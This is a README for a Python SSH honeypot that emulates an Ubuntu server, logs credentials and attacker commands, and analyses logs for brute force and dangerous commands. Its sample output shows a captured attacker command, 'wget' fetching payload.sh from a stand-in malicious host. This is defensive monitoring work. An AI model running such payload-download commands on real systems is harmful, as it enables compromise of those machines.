# SSH Honeypot

An interactive SSH Honeypot written in Python using the Paramiko library. It emulates an SSH server to attract, deceive, and monitor attackers. The system logs intrusion attempts (such as brute-force attacks) and records every command executed by the attacker within its custom emulated shell environment.

## Key Features

- **SSH Server Emulation**: Emulates an Ubuntu (OpenSSH) server to accept incoming connections. Supports authentication using a specific username/password or a credentials dictionary.
- **Emulated Shell**: Provides a virtual shell environment for attackers to interact with after a successful login.
  - Responds to basic system commands (`ls`, `pwd`, `whoami`, `uname`, `ifconfig`, etc.).
  - Includes a fake filesystem where attackers can discover and read files like `flag.txt` or system configurations.
  - Smoothly handles terminal navigation (arrow keys), backspace, and command history.
- **Detailed Logging**:
  - `auth.log`: Records authentication attempts (IP, username, password).
  - `cmd_logs.csv` / `cmd_logs.json`: Logs every command submitted by the attacker, complete with timestamps.
  - `alerts.log`: Triggers automated alerts when highly dangerous commands are detected (e.g., downloading payloads, deleting files).
- **Analysis Tool (`analyze_logs.py`)**: Automatically parses log files to identify IP addresses performing brute-force attacks and extracts lists of potentially harmful command executions.

## Directory Structure

- `src/`: Main source code directory.
  - `honeypy.py`: The main entry script of the program.
  - `ssh_honeypot.py`: The core script that manages the server, Paramiko connection, and emulated shell logic.
  - `analyze_logs.py`: Script for parsing and analyzing log data.
- `key/`: Stores the RSA key (`server.key`) used to identify the SSH Server.
- `log/`: Stores all generated log files (`auth.log`, `alerts.log`, `cmd_logs.csv`, etc.).

## Requirements and Installation

1. **Python 3.x**
2. Install the required dependencies:
```bash
pip install paramiko
```
3. Make sure you have an RSA key for the server located at `key/server.key`. If you don't have one, generate it using the following commands:
```bash
mkdir -p key log
ssh-keygen -t rsa -f key/server.key
```

## Usage

### 1. Starting the Honeypot

Run the `honeypy.py` script located in the `src` directory. You need to specify that this is an SSH honeypot via the `-s` / `--ssh` flag, along with the `-a` (IP address) and `-p` (port) flags.

**Run the honeypot to capture authentication attempts:**
```bash
python src/honeypy.py --ssh -a 0.0.0.0 -p 2222
```

**Run the honeypot and allow specific credentials to successfully log into the emulated shell:**
```bash
# Define a specific user 'root' with password '123456'
python src/honeypy.py --ssh -a 0.0.0.0 -p 2222 -u root -pw 123456

# Or use a text file containing user:password combinations (one per line)
python src/honeypy.py --ssh -a 0.0.0.0 -p 2222 --creds credentials/users.txt
```

### 2. Analyzing Attack Logs

The analysis script helps recognize which IPs attempted to brute-force passwords (defined as 5 or more attempts within a minute) and quickly view any payload download attempts or destructive commands.

```bash
python src/analyze_logs.py
```
Example Output:
```text
[+] Brute-force Detection:
  - 192.168.1.100 made 8 login attempts around 14:05:01

[+] Dangerous Commands:
  - 2026-04-21 14:15:00 | 192.168.1.100 executed: wget http://malicious.server/payload.sh
```
